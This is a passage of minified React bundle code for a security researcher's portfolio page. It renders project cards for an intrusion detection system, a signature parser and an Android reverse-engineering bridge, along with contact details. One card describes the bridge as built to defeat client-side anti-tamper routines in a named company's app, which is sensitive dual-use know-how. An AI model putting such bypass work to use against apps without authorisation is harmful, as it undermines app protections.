`).map((_,E)=>{let T="text-zinc-400";return _.startsWith("+")?T="text-emerald-400 bg-emerald-500/5":_.startsWith("-")?T="text-rose-400 bg-rose-500/5":_.startsWith("@@")&&(T="text-cyan-400 font-bold"),J.jsx("div",{className:`px-1 ${T}`,children:_},E)})})})]}),J.jsxs("div",{className:"flex flex-wrap items-center justify-between text-[11px] text-zinc-500 pt-1 border-t border-zinc-800/80",children:[J.jsxs("span",{children:["Coordinated Channel: ",x.protocol]}),J.jsx("span",{className:"text-emerald-400 font-semibold",children:"Status: Confirmed & Disclosed"})]})]})]},x.id)})})]}),J.jsxs("section",{className:"space-y-6",children:[J.jsxs("div",{className:"flex items-center justify-between font-mono",children:[J.jsxs("div",{className:"text-xs uppercase tracking-widest text-zinc-400 font-bold flex items-center gap-2",children:[J.jsx(Tx,{className:"w-4 h-4 text-emerald-400"}),J.jsx("span",{children:"Security Engineering & Instrumentation Tools"})]}),J.jsx("span",{className:"text-xs text-zinc-500",children:"HOVER TO ROTATE IN 3D"})]}),J.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-3 gap-4",children:[J.jsxs(Jh,{className:"p-6 sm:p-7 flex flex-col justify-between group md:col-span-2 border-beam",children:[J.jsxs("div",{className:"space-y-4",children:[J.jsxs("div",{className:"flex items-center justify-between font-mono text-xs",children:[J.jsxs("span",{className:"px-2.5 py-1 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 font-bold flex items-center gap-1.5",children:[J.jsx("span",{className:"w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping"}),"NEURAL EDGE NIDS"]}),J.jsx("span",{className:"text-zinc-500",children:"Rust / Python"})]}),J.jsxs("div",{className:"space-y-2",children:[J.jsx("h3",{className:"text-2xl font-bold text-white tracking-tight group-hover:text-emerald-300 transition-colors",children:"Senti_Argus — Autonomous Edge Intrusion Defense"}),J.jsx("p",{className:"text-sm text-zinc-300 leading-relaxed",children:"Low-latency local intrusion detection runtime with 4-layer Mixture-of-Experts neural routing. Evaluates raw packet streams via Windows Pktmon driver and promiscuous TAP, extracting 48-dimensional flow entropy vectors in sub-3 milliseconds without external cloud dependency."})]}),J.jsxs("div",{className:"rounded-xl bg-black/60 p-3 font-mono text-xs text-zinc-400 border border-zinc-800/80 space-y-1",children:[J.jsx("div",{className:"text-emerald-400 font-semibold",children:"✓ Ingestion: Native Windows Pktmon driver"}),J.jsx("div",{children:"→ Pipeline: Layer 1 Fast-Path (0.12ms) → Layer 4 Deep Anomaly Sequence"}),J.jsx("div",{className:"text-cyan-300",children:"⚡ Inference: 2.14ms (CIC-IDS Benchmark Tested)"})]})]}),J.jsxs("div",{className:"pt-6 flex items-center justify-between font-mono text-xs",children:[J.jsx("span",{className:"text-zinc-500",children:"Local-First Defense"}),J.jsxs("a",{href:"https://github.com/blah-blah-cell/argus-next",target:"_blank",rel:"noreferrer",className:"flex items-center gap-1 text-emerald-400 hover:text-emerald-300 font-bold transition-colors",children:[J.jsx("span",{children:"Repository"}),J.jsx(hl,{className:"w-4 h-4"})]})]})]}),J.jsxs(Jh,{className:"p-6 sm:p-7 flex flex-col justify-between group",children:[J.jsxs("div",{className:"space-y-4",children:[J.jsxs("div",{className:"flex items-center justify-between font-mono text-xs",children:[J.jsx("span",{className:"px-2.5 py-1 rounded-full bg-indigo-500/10 text-indigo-400 border border-indigo-500/20 font-bold",children:"BINARY FORENSICS"}),J.jsx("span",{className:"text-zinc-500",children:"Pure C"})]}),J.jsxs("div",{className:"space-y-2",children:[J.jsx("h3",{className:"text-xl font-bold text-white tracking-tight group-hover:text-indigo-300 transition-colors",children:"PE-Seal — Authenticode Forensic Parser"}),J.jsx("p",{className:"text-sm text-zinc-300 leading-relaxed",children:"Zero-dependency PE32 / PE32+ parser and digital signature extractor. Verifies PKCS#7 signed Authenticode binaries directly from raw byte streams without Win32 or OpenSSL runtime dependencies."})]})]}),J.jsxs("div",{className:"pt-6 flex items-center justify-between font-mono text-xs",children:[J.jsx("span",{className:"text-zinc-500",children:"Zero Dependencies"}),J.jsxs("a",{href:"https://github.com/blah-blah-cell/pe-seal",target:"_blank",rel:"noreferrer",className:"flex items-center gap-1 text-indigo-400 hover:text-indigo-300 font-bold transition-colors",children:[J.jsx("span",{children:"Repository"}),J.jsx(hl,{className:"w-4 h-4"})]})]})]}),J.jsxs(Jh,{className:"p-6 sm:p-7 flex flex-col justify-between group md:col-span-3",children:[J.jsxs("div",{className:"space-y-4",children:[J.jsxs("div",{className:"flex items-center justify-between font-mono text-xs",children:[J.jsx("span",{className:"px-2.5 py-1 rounded-full bg-amber-500/10 text-amber-400 border border-amber-500/20 font-bold",children:"NATIVE REVERSE ENGINEERING BRIDGE"}),J.jsx("span",{className:"text-zinc-500",children:"Ghidra 12.1 + Frida + MCP"})]}),J.jsxs("div",{className:"space-y-2",children:[J.jsx("h3",{className:"text-2xl font-bold text-white tracking-tight group-hover:text-amber-300 transition-colors",children:"Project Anvil — Android Native SRE Dynamic Instrumentation Engine"}),J.jsx("p",{className:"text-sm text-zinc-300 leading-relaxed max-w-3xl",children:"Automated reverse engineering bridge connecting NSA Ghidra 12.1 SRE, Android Virtual Device emulators, JADX decompilers, and Frida dynamic instrumentation over MCP. Built to disassemble proprietary ARM64 native shared libraries, defeat client-side anti-tamper routines, and trace JNI memory boundaries."})]})]}),J.jsxs("div",{className:"pt-6 flex items-center justify-between font-mono text-xs",children:[J.jsx("span",{className:"text-zinc-500",children:"ARM64 • Ghidra Headless • Frida Hooks"}),J.jsxs("a",{href:"https://github.com/blah-blah-cell/zomato-mcp-security-assessment",target:"_blank",rel:"noreferrer",className:"flex items-center gap-1 text-amber-400 hover:text-amber-300 font-bold transition-colors",children:[J.jsx("span",{children:"Audit Framework"}),J.jsx(hl,{className:"w-4 h-4"})]})]})]})]})]}),J.jsxs("section",{className:"space-y-4",children:[J.jsxs("div",{className:"flex items-center justify-between font-mono text-xs",children:[J.jsxs("div",{className:"uppercase tracking-widest text-zinc-400 font-bold flex items-center gap-2",children:[J.jsx(K3,{className:"w-4 h-4 text-cyan-400"}),J.jsx("span",{children:"Research Implementation Dossier"})]}),J.jsx("div",{className:"flex items-center gap-1",children:Su.map((x,v)=>J.jsx("button",{onClick:()=>f(v),className:`px-2.5 py-1 rounded transition-colors ${c===v?"bg-zinc-800 text-emerald-400 font-bold border border-zinc-700":"text-zinc-500 hover:text-zinc-300"}`,children:x.name},x.name))})]}),J.jsxs("div",{className:"rounded-2xl bg-black/90 border border-zinc-800 p-5 relative font-mono text-xs overflow-hidden shadow-2xl",children:[J.jsxs("div",{className:"flex items-center justify-between pb-3 mb-3 border-b border-zinc-800 text-zinc-400 text-[11px]",children:[J.jsx("span",{children:Su[c].desc}),J.jsxs("button",{onClick:()=>p(Su[c].code),className:"flex items-center gap-1 text-zinc-400 hover:text-white px-2 py-1 rounded bg-zinc-800 hover:bg-zinc-700 transition-colors",children:[d?J.jsx(Ex,{className:"w-3.5 h-3.5 text-emerald-400"}):J.jsx(bx,{className:"w-3.5 h-3.5"}),J.jsx("span",{children:d?"Copied":"Copy Code"})]})]}),J.jsx("pre",{className:"overflow-x-auto text-[11px] text-zinc-300 leading-relaxed max-h-[380px]",children:J.jsx("code",{children:Su[c].code})})]})]}),J.jsxs("footer",{className:"pt-12 border-t border-white/[0.08] flex flex-col sm:flex-row items-start sm:items-center justify-between gap-6 font-mono text-xs text-zinc-400",children:[J.jsxs("div",{className:"space-y-1.5",children:[J.jsx("div",{className:"text-white font-bold text-sm",children:"Ojas Mehta"}),J.jsx("div",{className:"text-zinc-500 text-[11px]",children:"Security Researcher & Systems Engineer"}),J.jsx("div",{className:"text-zinc-500 text-[11px]",children:"PGP: 4A82 D901 3E7B 991F 2088 • Coordinated Disclosures"})]}),J.jsxs("div",{className:"flex flex-wrap items-center gap-3",children:[J.jsxs("button",{onClick:m,className:"flex items-center gap-1.5 px-3.5 py-2 rounded-xl bg-zinc-900 hover:bg-zinc-800 text-zinc-200 hover:text-white transition-colors border border-white/10",children:[o?J.jsx(Ex,{className:"w-3.5 h-3.5 text-emerald-400"}):J.jsx(bx,{className:"w-3.5 h-3.5 text-zinc-400"}),J.jsx("span",{children:o?"Copied":"kidakabadiop2010@gmail.com"})]}),J.jsxs("a",{href:"https://github.com/blah-blah-cell",target:"_blank",rel:"noreferrer",className:"flex items-center gap-1.5 px-3.5 py-2 rounded-xl bg-zinc-900 hover:bg-zinc-800 text-zinc-200 hover:text-white transition-colors border border-white/10",children:[J.jsx(Ax,{className:"w-3.5 h-3.5"}),J.jsx("span",{children:"@blah-blah-cell"}),J.jsx(hl,{className:"w-3.5 h-3.5 text-zinc-500"})]})]})]})]})]})}pE.createRoot(document.getElementById("root")).render(J.jsx(sE.StrictMode,{children:J.jsx(J3,{})}));
